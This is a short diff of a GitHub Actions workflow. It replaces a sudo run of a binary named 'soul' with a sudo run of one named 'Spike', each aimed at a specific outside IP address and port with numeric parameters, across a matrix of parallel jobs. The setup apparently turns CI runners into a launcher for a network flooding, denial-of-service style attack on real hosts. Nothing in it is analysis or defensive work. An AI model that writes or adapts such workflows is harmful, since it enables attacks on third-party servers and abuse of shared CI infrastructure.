@@ -10,5 +10,5 @@ jobs:
             11,12,13,14,15]
     steps:
     - uses: actions/checkout@v3
-    - run: chmod +x soul
-    - run: sudo ./soul 91.108.17.3 32002 120
+    - run: chmod +x Spike
+    - run: sudo ./Spike 52.140.2.176 28133 200 512 100
